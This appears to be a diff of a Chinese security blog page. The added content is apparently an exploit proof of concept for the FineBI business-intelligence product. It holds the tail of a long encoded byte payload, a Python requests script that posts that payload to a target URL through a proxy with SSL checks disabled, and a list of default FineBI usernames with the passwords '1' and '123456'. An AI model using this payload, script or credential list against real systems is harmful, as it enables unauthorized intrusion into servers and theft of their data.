nu\x99J&lt;\xa6\xc3\xb8\xa5\xab\x02/L`\x8f\xe4\xdd\x1aU\&#39;q{\xbc4\xf2e\xdf\x05\x93\xb8#^\x16-\x1b\xc7\xdd\xbc^Ydo\xd0SyoG\x97_\xca\xe8\nx\x92\xee\x8bjAWR\xb4t\x1c\xdf\xe1\xa2\x94\xe8\x93\xf2\xba\x02.\xe9\xc8$\xc6&lt;\xd9\xee1\x1e\xf1\x8e\x11-+&lt;ETsw\x8c\xa1#^\x16y\xd4\xd3]\x1e-\x8f|\xdf\xff\xa1R\xa9\xa8\xdc_\xa0H\xa2\xa1M\x17Y&gt;\x8bH\x7f\xe3\xbc{\xe8\x12(\xba9$\xc6&gt;\xb8\xde\x9b\x94\x8e!\x10\x0f\xde\x1c\x10c\xef\xdf8\x06\xff\x86\x03\xf4\xe1\x07\xf1\x18\x0e&#34;\xc2\xd8|\x0b\x7fED\xbc\xa44+kq:;\xb8\xf5\xcac\xa8\xc2\x06\xf4\xbb\xa3\x89[\xddq\x8f\xf2\x88;\x06\x94\t\xe5I\x8e\x8a\x1b@\xef\xe12FY\x98\x91Q\x82R\xfeW\xa2\x0cg1Z\x161F\x96R\xfaJJl&amp;u\x0396c\x0e\xa5\xcde-\x8fb\x14\xf3p\x13\xe6c\x0f[\xba\xbb\x18\x9d\xf7b\x01Ot6\xcft\x0eO\xb5\x10\x87\x98&amp;\x9f\xa5\x94\x17q.Ox\x1e\xcfX\xc7S\xd6\xe0m\xd4\xe2\x1f8\x1f\xfff\x07\xfd&gt;\xea\x85\xc6\x16\xba\x04\rb&gt;\x96\x88:,\x15\x17\xb3)^\x85e\xa2\x05\x17\x896\\,\xfa\xd9\xf9\xde\x86\x15b/\x9b\xdegq\x89x\t\x8d\xe2U\xac\x14o\xe0Re!.S\x9a!o}\xb9\xb2\x1e\xab\x94+\xb1Zq\xd0\xa4\xdc\x895\xca\xddX\xab\xdc\x87%\xcaCDc\x1f\xae\xe0\xcd\x13\xca\x01D\x94\t\xb4\xf3\xf6m\xcaal\xe4\xa9\x80\x87Qy\x9c=vP\xa8\x98\xabb\x9e\x8a3T,`\xf68\x86*\x15g\x1f\x93\x94j\xe5\x18\xaaU\xb6\xa2*&#34;\x91k\xf8\x15\xe6\xc1U,\x12\xc7\xc5y(\x9b\xceH\x1e\xd5\xdd,\xd7\xdd\xc1\xfb,\x06g\xa7\x1f\xc3F\xce\xfe\x03\x11|\x17\x81\xe0q\x9a`\xa6^N\xab\x8e\xc9o\xff{\x08\xc8\rpI`\x82+9\x91\xe0\xfe\xc2\xdc(\xc7=u\xe2!\x84\xea\x183\xae\x93\xec\x14\xad\x91\xc7\&#39;\xf1\xc48\x9e\x8a\x1ca\xf2\xb9\x07Q:z5\xbd\xf1(\xbd&lt;\xf2c\xfaw]G+\xd3H\x9e\xfaSI}\xce\xa3N\xe2%f\xbaW\xc6\xf1j\xdba,\xee\x9a\xc0\xef\xda}\xcb\xfd\x15~&lt;\xa5\xc5\x03c\x08\xd7G\x03\xbeJ\x06\xf4k\x17D\x03\xe3\xf8S\xd7r\xbfr\xff\xf1w\xea\xf7\x8fA\x8bS\xb5O\xecwS\xeen\x96\xfe*&gt;IdW\xa2(L\xe4\xce\xe35&#34;P\\T\x1e\x03\x8e\xd3\xbb\x82\xdeD\xc5\x01\x02\xc3\xeb\xdd\xcb\x04}\x9c\xbe\xc7\xc7j\x80}J\x15+AN\xfe\x90P\xce\xeb\xfb\xf3\xaf\xf9\x17\xc97\xde\xc2\xd7|\xaf\x03k\x90?\xcc\xb0\xa6\xd8\xde\x1b\xa3\xd7\x08u\x8ef\x8c\x8fx\xcd\x9f^\x8a\xa6X\xdcRD\xa6\xaca\x9bzj\x8bag\xf9\xae|Ub\r\xedrE`\xc7\xdf\xcc\xbf\xaf\x1cZ7\x97/\x04|\xdd\x93m\x98\xb3E\xb6C3~5\x08\xd3L%\xf2\x8d\xad4\xff\xfbAAi\x9bG\xb3i\x1c\x8b\xe5\x8f\x1a4\xa9\xacS\xf2\xf5_\xc8\x8b\x16\xd4\xad\t\x94\x1dp\xeb\x96\xac\x80rk0\xe3@\xe8\x99a\x81\x11\tK\xc9\xc8\xff\x00\xdc\x95|\xf4(\x13\x00\x00&#39;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># 发送请求
+</span></span><span class="line"><span class="cl">try:
+</span></span><span class="line"><span class="cl">    resp = requests.post(
+</span></span><span class="line"><span class="cl">        target_url,
+</span></span><span class="line"><span class="cl">        data=data,
+</span></span><span class="line"><span class="cl">        headers=headers,
+</span></span><span class="line"><span class="cl">        proxies=proxies,
+</span></span><span class="line"><span class="cl">        verify=False,  # 忽略 SSL 警告
+</span></span><span class="line"><span class="cl">        timeout=15
+</span></span><span class="line"><span class="cl">    )
+</span></span><span class="line"><span class="cl">    print(resp.text)
+</span></span><span class="line"><span class="cl">except Exception as e:
+</span></span><span class="line"><span class="cl">    print(f&#34;[ERROR] {e}&#34;)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>默认用户名与密码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Abby</span><span class="err">、</span><span class="n">Anna</span><span class="err">、</span><span class="n">Alice</span><span class="err">、</span><span class="n">Ben</span><span class="err">、</span><span class="n">Billy</span><span class="err">、</span><span class="n">Cherry</span><span class="err">、</span><span class="n">demo</span><span class="err">、</span><span class="n">eoco</span><span class="err">、</span><span class="n">hanwen</span><span class="err">、</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Jack</span><span class="err">、</span><span class="n">Jenny</span><span class="err">、</span><span class="n">Lily</span><span class="err">、</span><span class="n">Lisa</span><span class="err">、</span><span class="n">Mike</span><span class="err">、</span><span class="n">sunlin</span><span class="err">、</span><span class="n">Tom</span><span class="err">、</span><span class="n">wangwei</span><span class="err">、</span><span class="n">zhangshan</span><span class="err">、</span><span class="n">erick</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">password</span><span class="err">：</span><span class="n">1</span><span class="o">/</span><span class="n">123456</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><a class="link" href="https://help.fanruan.com/finebi/"  target="_blank" rel="noopener"
+    >https://help.fanruan.com/finebi/</a></p>
 
 </section>
 
@@ -363,7 +953,7 @@
 
 
         <span>
-            最后更新于 Nov 02, 2025 19:44 &#43;0800
+            最后更新于 Dec 01, 2025 11:08 &#43;0800
         </span>
     </section></footer>
 
